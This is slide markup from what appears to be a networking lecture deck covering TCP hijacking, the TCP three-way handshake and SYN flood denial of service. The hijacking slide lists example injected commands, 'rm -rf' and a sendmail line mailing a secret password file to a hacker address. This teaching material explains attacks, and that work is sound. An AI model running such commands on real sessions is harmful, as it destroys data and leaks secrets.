          <a:xfrm>
            <a:off x="7175520" y="630720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9</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="881" name="CustomShape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1216080" y="3567240"/>
            <a:ext cx="1887120" cy="1929960"/>
          </a:xfrm>
          <a:prstGeom prst="mathMultiply">
            <a:avLst>
              <a:gd name="adj1" fmla="val 12853"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF0000">
              <a:alpha val="30000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="C00000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="4000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Afbeelding 2"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2052720" y="4241880"/>
            <a:ext cx="4695480" cy="2590560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="883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TCP hijacking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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="1527120"/>
            <a:ext cx="822924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So now you can send false data to host B, but not get a reply (remember the fake source IP address?). Is this a big deal?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TCP segments will carry application data. If we had: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an open telnet session, we can send commands: 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</a:rPr>
              <a:t>rm -rf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, or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ourier New"/>
              </a:rPr>
              <a:t>sendmail hacker@email.com &lt; secret_password_file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an open HTTP session, we can post form data, make transactions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an open FTP session, we can send files / malware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etc.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E177457-9570-4DD6-A4C0-A7ACA123A44F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27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86" name="Picture 6" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="484200" y="1273320"/>
            <a:ext cx="2342880" cy="186840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="887" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6748560" y="652464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9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TextShape 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="393840" y="592200"/>
            <a:ext cx="8356320" cy="8488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Opening a TCP connection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9" name="Picture 80" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="1246320"/>
            <a:ext cx="4452480" cy="161640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="890" name="Line 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="2406600" y="2857320"/>
            <a:ext cx="1440" cy="2470320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9360">
            <a:solidFill>
              <a:srgbClr val="7777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91" name="Group 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="298440" y="2784600"/>
            <a:ext cx="4616280" cy="955440"/>
            <a:chOff x="298440" y="2784600"/>
            <a:chExt cx="4616280" cy="955440"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="892" name="Line 4"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2408040" y="3004920"/>
              <a:ext cx="2506680" cy="735120"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28440">
              <a:solidFill>
                <a:srgbClr val="000099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3" name="CustomShape 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3132000" y="3105000"/>
              <a:ext cx="936360" cy="42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4" name="CustomShape 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2700360" y="3198960"/>
              <a:ext cx="194292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SYNbit=1, Seq=x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895" name="CustomShape 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="298440" y="2784600"/>
              <a:ext cx="2197440" cy="473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choose init seq num, x</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="r"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send TCP SYN msg</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="896" name="Line 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4995720" y="2927160"/>
            <a:ext cx="1440" cy="3417840"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9360">
            <a:solidFill>
              <a:srgbClr val="77777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7" name="CustomShape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7157160" y="5765760"/>
            <a:ext cx="821160" cy="33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strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>ESTAB</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="898" name="Group 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2404800" y="3454560"/>
            <a:ext cx="4641480" cy="1425240"/>
            <a:chOff x="2404800" y="3454560"/>
            <a:chExt cx="4641480" cy="1425240"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="899" name="Line 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="2404800" y="3844800"/>
              <a:ext cx="2508480" cy="1035000"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28440">
              <a:solidFill>
                <a:srgbClr val="000099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0" name="CustomShape 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2914560" y="4122720"/>
              <a:ext cx="1422000" cy="518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1" name="CustomShape 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2411280" y="4064040"/>
              <a:ext cx="2737080" cy="577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SYNbit=1, Seq=y</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri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ACKbit=1; ACKnum=x+1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902" name="CustomShape 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4848840" y="3454560"/>
              <a:ext cx="2197440" cy="6649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choose init seq num, y</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri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send TCP SYNACK</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri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msg, acking SYN</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="903" name="Group 15"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="268200" y="4552920"/>
            <a:ext cx="6617160" cy="1370520"/>
            <a:chOff x="268200" y="4552920"/>
            <a:chExt cx="6617160" cy="1370520"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="904" name="Line 16"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2425680" y="4951080"/>
              <a:ext cx="2506680" cy="735120"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28440">
              <a:solidFill>
                <a:srgbClr val="000099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5" name="CustomShape 17"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3081240" y="5075280"/>
              <a:ext cx="1230120" cy="428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6" name="CustomShape 18"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2303280" y="5148360"/>
              <a:ext cx="273240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ACKbit=1, ACKnum=y+1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907" name="CustomShape 19"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="268200" y="4552920"/>
              <a:ext cx="2237040" cy="6649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received SYNACK(x) </a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="r"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indicates server is live;</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="r"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send ACK for SYNACK;</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="908" name="CustomShape 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4780800" y="5450040"/>
              <a:ext cx="2104560" cy="473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received ACK(y) </a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri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indicates client is live</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="909" name="Group 21"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6770160" y="2877840"/>
            <a:ext cx="2040480" cy="1433160"/>
            <a:chOff x="6770160" y="2877840"/>
            <a:chExt cx="2040480" cy="1433160"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="910" name="CustomShape 22"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6770160" y="3733920"/>
              <a:ext cx="2040480" cy="577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Reserve resources</a:t>
              </a:r>
              <a:br/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for connection</a:t>
              </a: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911" name="Line 23"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7610400" y="2877840"/>
              <a:ext cx="0" cy="90324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12" name="Line 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7584840" y="4317840"/>
            <a:ext cx="7920" cy="1467000"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="936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913" name="Group 25"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2162520" y="2151000"/>
            <a:ext cx="5900760" cy="716400"/>
            <a:chOff x="2162520" y="2151000"/>
            <a:chExt cx="5900760" cy="716400"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="914" name="CustomShape 26"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6662880" y="2151000"/>
              <a:ext cx="1400400" cy="577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600" b="0" i="1" strike="noStrike" spc="-1">
                  <a:solidFill>
                    <a:srgbClr val="000099"/>
                  </a:solidFill>
                  <a:latin typeface="Tahoma"/>
                  <a:ea typeface="ＭＳ Ｐゴシック"/>
                </a:rPr>
                <a:t>server state</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="r">
                <a:lnSpc>
                  <a:spcPct val="100000"/>
                </a:lnSpc>
              </a:pPr>
              <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="915" name="CustomShape 27"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7101720" y="2533680"/>
              <a:ext cx="882360" cy="3337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 strike="noStrike" spc="-1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Tahoma"/>
                  <a:ea typeface="ＭＳ Ｐゴシック"/>
                </a:rPr>
                <a:t>LISTEN</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="916" name="Group 28"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2162520" y="2208240"/>
              <a:ext cx="642600" cy="599760"/>
              <a:chOff x="2162520" y="2208240"/>
              <a:chExt cx="642600" cy="599760"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="917" name="Picture 119" descr="desktop_computer_stylized_medium"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId3"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="2162520" y="2208240"/>
                <a:ext cx="642600" cy="59976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18" name="CustomShape 29"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="2435400" y="2265840"/>
                <a:ext cx="31212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810000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919" name="Group 30"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="4794120" y="2211480"/>
              <a:ext cx="336240" cy="512280"/>
              <a:chOff x="4794120" y="2211480"/>
              <a:chExt cx="336240" cy="512280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="920" name="CustomShape 31"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5060520" y="2212200"/>
                <a:ext cx="66600" cy="488880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1" name="CustomShape 32"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4809960" y="2211480"/>
                <a:ext cx="247320" cy="488520"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:pr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2" name="CustomShape 33"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5073120" y="2241720"/>
                <a:ext cx="39600" cy="452160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3" name="CustomShape 34"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5064480" y="2470680"/>
                <a:ext cx="619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4" name="CustomShape 35"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4811760" y="2268360"/>
                <a:ext cx="139320" cy="936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925" name="Group 36"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="4938480" y="2262240"/>
                <a:ext cx="136080" cy="31320"/>
                <a:chOff x="4938480" y="2262240"/>
                <a:chExt cx="136080" cy="31320"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="926" name="CustomShape 37"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="4938480" y="2262240"/>
                  <a:ext cx="136080" cy="313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927" name="CustomShape 38"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="4941720" y="2265480"/>
                  <a:ext cx="129960" cy="252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928" name="CustomShape 39"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4813560" y="2338200"/>
                <a:ext cx="140760" cy="936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929" name="Group 40"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="4937040" y="2332080"/>
                <a:ext cx="137880" cy="28440"/>
                <a:chOff x="4937040" y="2332080"/>
                <a:chExt cx="137880" cy="28440"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="930" name="CustomShape 41"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="4937040" y="2332080"/>
                  <a:ext cx="137880" cy="284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931" name="CustomShape 42"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="4940280" y="2335320"/>
                  <a:ext cx="131400" cy="2196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932" name="CustomShape 43"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4811760" y="2409840"/>
                <a:ext cx="140760" cy="936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33" name="CustomShape 44"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4814640" y="2473200"/>
                <a:ext cx="140760" cy="10800"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="tx1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934" name="Group 45"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="4935600" y="2468520"/>
                <a:ext cx="136080" cy="31320"/>
                <a:chOff x="4935600" y="2468520"/>
                <a:chExt cx="136080" cy="31320"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="935" name="CustomShape 46"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="4935600" y="2468520"/>
                  <a:ext cx="136080" cy="313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936" name="CustomShape 47"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="4938840" y="2471760"/>
                  <a:ext cx="129960" cy="2484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937" name="CustomShape 48"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5065200" y="2409480"/>
                <a:ext cx="619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938" name="Group 49"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="4935600" y="2403720"/>
                <a:ext cx="137520" cy="29880"/>
                <a:chOff x="4935600" y="2403720"/>
                <a:chExt cx="137520" cy="29880"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="939" name="CustomShape 50"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="4935600" y="2403720"/>
                  <a:ext cx="137520" cy="2988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940" name="CustomShape 51"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="4938840" y="2406600"/>
                  <a:ext cx="131400" cy="23400"/>
                </a:xfrm>
                <a:prstGeom prst="roundRect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/>
                </a:gra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  <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="941" name="CustomShape 52"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5056200" y="2211480"/>
                <a:ext cx="15480" cy="490320"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:gradFill rotWithShape="0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/>
              </a:gra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2" name="CustomShape 53"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5070960" y="2334960"/>
                <a:ext cx="55440" cy="4536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3" name="CustomShape 54"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5071680" y="2265120"/>
                <a:ext cx="5724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4" name="CustomShape 55"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5119560" y="2678040"/>
                <a:ext cx="10800" cy="2016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5" name="CustomShape 56"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5068800" y="2679120"/>
                <a:ext cx="576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6" name="CustomShape 57"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4794120" y="2692440"/>
                <a:ext cx="282240" cy="3132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7" name="CustomShape 58"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4809960" y="2700360"/>
                <a:ext cx="252000" cy="17280"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst>
                  <a:gd name="adj" fmla="val 50000"/>
                </a:avLst>
              </a:prstGeom>
              <a:gradFill rotWithShape="0">
                <a:gsLst>
                  <a:gs pos="0">
                    <a:srgbClr val="1F497D"/>
                  </a:gs>
                  <a:gs pos="100000">
                    <a:srgbClr val="EEECE1"/>
                  </a:gs>
                </a:gsLst>
                <a:lin ang="0"/>
              </a:gradFill>
              <a:ln w="93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8" name="CustomShape 59"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4834080" y="2629080"/>
                <a:ext cx="36360" cy="3132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49" name="CustomShape 60"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4875120" y="2630520"/>
                <a:ext cx="37800" cy="298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50" name="CustomShape 61"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4917960" y="2629080"/>
                <a:ext cx="36360" cy="2988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51" name="CustomShape 62"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5011920" y="2512800"/>
                <a:ext cx="20160" cy="161640"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="292929"/>
              </a:solidFill>
              <a:ln w="936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952" name="TextShape 6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9AC40278-C575-42B7-9DCF-87042BDDF685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28</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="953" name="TextShape 64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="1527120"/>
            <a:ext cx="8229240" cy="433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The 3-way handshake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CustomShape 65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="906480" y="2119320"/>
            <a:ext cx="735840" cy="577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0099"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>client</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="r">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="955" name="CustomShape 66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="393840" y="651204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10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5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Effect">
                      <p:stCondLst>
                        <p:cond delay="indefinite"/>
                      </p:stCondLst>
                      <p:childTnLst>
                        <p:par>
                          <p:cTn id="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4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SYN flood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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="1527120"/>
            <a:ext cx="401616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 SYN-flood is a type of DOS attack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Attacker sends number of SYNs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Server reserves resources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Attacker never completes connections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Server reaches maximum number of connections…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…and cannot accept new, legitimate connections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AC6B964D-BA32-45A0-8B5D-45D1C0A798A9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29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959" name="Picture 6" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="484200" y="1273320"/>
            <a:ext cx="1773000" cy="186840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="960" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8150400" y="472752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11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961" name="Picture 2" descr="Progression of a SYN flood."/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
